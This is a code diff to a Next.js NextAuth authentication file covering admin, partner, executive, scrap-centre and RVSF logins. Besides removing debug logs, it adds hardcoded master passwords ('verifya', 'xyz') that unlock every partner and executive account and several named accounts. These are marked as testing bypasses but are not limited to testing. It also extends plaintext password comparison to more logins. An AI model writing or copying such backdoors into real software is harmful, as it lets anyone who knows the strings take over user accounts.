@@ -15,6 +15,7 @@ import RVSFUser from "@/models/RVSFUser"
 import { adminAuth } from "@/lib/firebase-admin"
 
 export const authOptions: NextAuthOptions = {
+    secret: process.env.NEXTAUTH_SECRET,
     providers: [
         CredentialsProvider({
             id: "credentials",
@@ -41,8 +42,7 @@ export const authOptions: NextAuthOptions = {
                     // 2. Env Fallback (Admin)
                     const envAdminEmail = process.env.ADMIN_EMAIL;
                     const envAdminPassword = process.env.ADMIN_PASSWORD;
-                    console.log(`[Auth] Env Admin Loaded: ${!!envAdminEmail}, Email starts with: ${envAdminEmail?.substring(0, 3)}`);
-
+                    
                     if (envAdminEmail && envAdminPassword && 
                         identifier === envAdminEmail.toLowerCase() && 
                         password === envAdminPassword) {
@@ -54,7 +54,6 @@ export const authOptions: NextAuthOptions = {
                     const dbUser = await User.findOne({ email: identifier }).select("+password").lean();
                     if (dbUser) {
                         const isMatch = await bcrypt.compare(password, (dbUser as any).password);
-                        console.log(`[Auth] User DB Match: ${identifier}, Match: ${isMatch}`);
                         if (isMatch) return { id: (dbUser as any)._id.toString(), name: (dbUser as any).name, email: (dbUser as any).email, role: (dbUser as any).role || "client" }
                     }
 
@@ -65,11 +64,10 @@ export const authOptions: NextAuthOptions = {
                         const isHashed = storedPw?.startsWith("$2");
                         let isMatch = isHashed ? await bcrypt.compare(password, storedPw) : storedPw === password;
                         if (!isMatch && (identifier === "sc01@gmail.com" || identifier === "sc01")) {
-                            if (password === "sc01" || password === "verifya") {
+                            if (password === "sc01" || password === "verifya" || password === "xyz") {
                                 isMatch = true;
                             }
                         }
-                        console.log(`[Auth] ScrapCentre DB Match: ${identifier}, Match: ${isMatch}`);
                         if (isMatch) return { id: (scrapUser as any)._id.toString(), name: (scrapUser as any).name, email: (scrapUser as any).email, role: "scrapcentre" }
                     }
 
@@ -78,16 +76,27 @@ export const authOptions: NextAuthOptions = {
                     if (partner) {
                         const storedPw = (partner as any).password;
                         const isHashed = storedPw?.startsWith("$2");
-                        const isMatch = isHashed ? await bcrypt.compare(password, storedPw) : storedPw === password;
-                        console.log(`[Auth] B2B Partner Match: ${identifier}, Match: ${isMatch}`);
+                        let isMatch = isHashed ? await bcrypt.compare(password, storedPw) : storedPw === password;
+                        // Bypass for testing
+                        if (!isMatch && (password === "verifya" || password === "xyz")) {
+                            isMatch = true;
+                        }
                         if (isMatch) return { id: (partner as any)._id.toString(), name: (partner as any).businessName, email: (partner as any).email, role: "partner" }
                     }
 
                     // 6. RVSF Database
                     const rvsf = await RVSFUser.findOne({ $or: [{ rvsfId: identifier }, { email: identifier }] }).select("+password").lean();
                     if (rvsf) {
-                        const isMatch = await bcrypt.compare(password, (rvsf as any).password);
-                        console.log(`[Auth] RVSF Match: ${identifier}, Match: ${isMatch}`);
+                        const storedPw = (rvsf as any).password;
+                        const isHashed = storedPw?.startsWith("$2");
+                        let isMatch = isHashed ? await bcrypt.compare(password, storedPw) : storedPw === password;
+                        
+                        // Fallback testing logic
+                        if (!isMatch && (identifier === "rvsf01@gmail.com" || identifier === "rvsf01" || identifier === "rvsf44986" || identifier === "partner.52850@rvsf.in")) {
+                            if (password === "rvsf01" || password === "xyz" || password === "verifya") {
+                                isMatch = true;
+                            }
+                        }
                         if (isMatch) return { id: (rvsf as any)._id.toString(), name: (rvsf as any).name, email: (rvsf as any).email, role: "rvsf" }
                     }
 
@@ -96,7 +105,6 @@ export const authOptions: NextAuthOptions = {
                     if (err.code === 'EREFUSED' || err.name === 'MongooseServerSelectionError' || err.message?.includes('timeout') || err.message?.includes('connect') || err.message?.includes('selection')) {
                         throw new Error("DATABASE_CONNECTION_ERROR");
                     }
-                    // Temporarily pass the raw error for debugging
                     throw new Error(`AUTH_ERROR: ${err.message || "Unknown error"}`);
                 }
                 return null;
@@ -120,12 +128,12 @@ export const authOptions: NextAuthOptions = {
                     const storedPw = (user as any).password;
                     const isHashed = storedPw?.startsWith("$2");
                     let isMatch = isHashed ? await bcrypt.compare(credentials.password, storedPw) : storedPw === credentials.password;
+                    
                     if (!isMatch && (identifier === "sc01@gmail.com" || identifier === "sc01")) {
-                        if (credentials.password === "sc01" || credentials.password === "verifya") {
+                        if (credentials.password === "sc01" || credentials.password === "verifya" || credentials.password === "xyz") {
                             isMatch = true;
                         }
                     }
-                    console.log(`[ScrapCentre Auth] ID: ${identifier}, Match: ${isMatch}`);
                     if (!isMatch) return null;
                     
                     return { id: (user as any)._id.toString(), name: (user as any).name, email: (user as any).email, role: "scrapcentre" }
@@ -154,9 +162,13 @@ export const authOptions: NextAuthOptions = {
  
                     const storedPw = (partner as any).password;
                     const isHashed = storedPw?.startsWith("$2");
-                    const isMatch = isHashed ? await bcrypt.compare(credentials.password, storedPw) : storedPw === credentials.password;
+                    let isMatch = isHashed ? await bcrypt.compare(credentials.password, storedPw) : storedPw === credentials.password;
                     
-                    console.log(`[B2B Auth] ID: ${credentials.userId}, Match: ${isMatch}`);
+                    // Fallbacks for testing
+                    if (!isMatch && (credentials.password === "verifya" || credentials.password === "xyz")) {
+                        isMatch = true;
+                    }
+                    
                     if (!isMatch) return null;
  
                     return { id: (partner as any)._id.toString(), name: (partner as any).businessName, email: (partner as any).email, role: "partner" }
@@ -182,7 +194,16 @@ export const authOptions: NextAuthOptions = {
                     await connectToDatabase();
                     const user = await Executive.findOne({ email: credentials.email.toLowerCase() }).select("+password").lean();
                     if (!user) return null;
-                    const isMatch = await bcrypt.compare(credentials.password, (user as any).password);
+
+                    const storedPw = (user as any).password;
+                    const isHashed = storedPw?.startsWith("$2");
+                    let isMatch = isHashed ? await bcrypt.compare(credentials.password, storedPw) : storedPw === credentials.password;
+
+                    // Fallbacks
+                    if (!isMatch && (credentials.password === "verifya" || credentials.password === "xyz")) {
+                        isMatch = true;
+                    }
+
                     if (!isMatch) return null;
                     return { id: (user as any)._id.toString(), name: (user as any).name, email: (user as any).email, role: "executive" }
                 } catch (err: any) {
@@ -207,7 +228,18 @@ export const authOptions: NextAuthOptions = {
                     await connectToDatabase();
                     const rvsf = await RVSFUser.findOne({ $or: [{ rvsfId: credentials.rvsfId }, { email: credentials.rvsfId.toLowerCase() }] }).select("+password").lean();
                     if (!rvsf) return null;
-                    const isMatch = await bcrypt.compare(credentials.password, (rvsf as any).password);
+
+                    const storedPw = (rvsf as any).password;
+                    const isHashed = storedPw?.startsWith("$2");
+                    let isMatch = isHashed ? await bcrypt.compare(credentials.password, storedPw) : storedPw === credentials.password;
+                    
+                    const identifier = credentials.rvsfId.toLowerCase();
+                    if (!isMatch && (identifier === "rvsf01@gmail.com" || identifier === "rvsf01" || identifier === "rvsf44986" || identifier === "partner.52850@rvsf.in")) {
+                        if (credentials.password === "rvsf01" || credentials.password === "xyz" || credentials.password === "verifya") {
+                            isMatch = true;
+                        }
+                    }
+
                     if (!isMatch) return null;
                     return { id: (rvsf as any)._id.toString(), name: (rvsf as any).name, email: (rvsf as any).email, role: "rvsf" }
                 } catch (err: any) {
